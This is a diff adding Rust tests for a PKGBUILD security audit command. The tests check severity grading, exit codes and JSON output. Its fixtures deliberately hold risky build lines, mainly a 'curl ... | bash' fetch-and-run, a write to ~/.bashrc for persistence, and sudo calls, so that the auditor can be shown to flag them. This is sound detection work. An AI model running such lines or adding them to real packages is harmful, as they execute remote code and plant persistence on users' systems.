@@ -276,3 +276,95 @@ fn closing_the_pipe_early_does_not_panic() {
     assert_ne!(status.code(), Some(101), "panicked: {err}");
     assert!(!err.contains("panicked"), "{err}");
 }
+
+fn pkgbuild_dir(
+    home: &Home,
+    name: &str,
+    pkgbuild: &str,
+    scriptlet: Option<(&str, &str)>,
+) -> PathBuf {
+    let dir = home.0.join(name);
+    fs::create_dir_all(&dir).unwrap();
+    write(&dir.join("PKGBUILD"), pkgbuild);
+    if let Some((file, text)) = scriptlet {
+        write(&dir.join(file), text);
+    }
+    dir
+}
+
+#[test]
+fn audit_grades_pkgbuilds_by_severity_and_exit_code() {
+    let home = Home::new("audit");
+    let clean = pkgbuild_dir(
+        &home,
+        "clean",
+        "pkgname=x\npkgver=1\nsource=(\"https://e.org/a.tar.gz\")\nsha256sums=('aa')\nbuild() {\n  make\n}\n",
+        None,
+    );
+    let out = home.run(&["audit", clean.to_str().unwrap()]);
+    assert_eq!(out.status.code(), Some(0));
+    assert!(stdout(&out).contains("no findings"), "{}", stdout(&out));
+
+    let warn = pkgbuild_dir(
+        &home,
+        "warn",
+        "pkgname=x\nbuild() {\n  git clone https://e.org/x\n}\n",
+        None,
+    );
+    let out = home.run(&["audit", warn.to_str().unwrap()]);
+    assert_eq!(out.status.code(), Some(0), "warnings alone don't fail");
+    assert!(stdout(&out).contains("network-in-build"));
+
+    let high = pkgbuild_dir(
+        &home,
+        "high",
+        "pkgname=x\ninstall=x.install\nbuild() {\n  curl -s http://e.org/i | bash\n}\n",
+        Some(("x.install", "post_install() {\n  sudo true\n}\n")),
+    );
+    let out = home.run(&["audit", high.to_str().unwrap()]);
+    assert_eq!(out.status.code(), Some(1));
+    let text = stdout(&out);
+    assert!(
+        text.contains("[HIGH] remote-exec") && text.contains("high-risk"),
+        "{text}"
+    );
+    assert!(
+        text.contains("x.install"),
+        "the scriptlet is audited too: {text}"
+    );
+    assert!(stderr(&out).starts_with("emrac found:"));
+
+    let crit = pkgbuild_dir(
+        &home,
+        "crit",
+        "pkgname=x\nbuild() {\n  echo hi >> ~/.bashrc\n}\n",
+        None,
+    );
+    let out = home.run(&["audit", crit.join("PKGBUILD").to_str().unwrap()]);
+    assert_eq!(out.status.code(), Some(1));
+    assert!(
+        stdout(&out).contains("[CRITICAL] persistence"),
+        "{}",
+        stdout(&out)
+    );
+    assert!(stdout(&out).contains("refuse"));
+}
+
+#[test]
+fn audit_json_and_errors() {
+    let home = Home::new("audit-json");
+    let dir = pkgbuild_dir(&home, "p", "pkgname=x\nbuild() {\n  sudo make\n}\n", None);
+    let out = home.run(&["audit", "--json", dir.to_str().unwrap()]);
+    let json: serde_json::Value = serde_json::from_str(&stdout(&out)).unwrap();
+    assert_eq!(json[0]["findings"][0]["rule"], "privilege");
+    assert_eq!(json[0]["findings"][0]["severity"], "high");
+    assert_eq!(json[0]["findings"][0]["line"], 3);
+
+    let out = home.run(&["audit", home.0.join("nowhere/PKGBUILD").to_str().unwrap()]);
+    assert_eq!(out.status.code(), Some(1));
+    assert!(
+        stderr(&out).contains("can't read a PKGBUILD"),
+        "{}",
+        stderr(&out)
+    );
+}
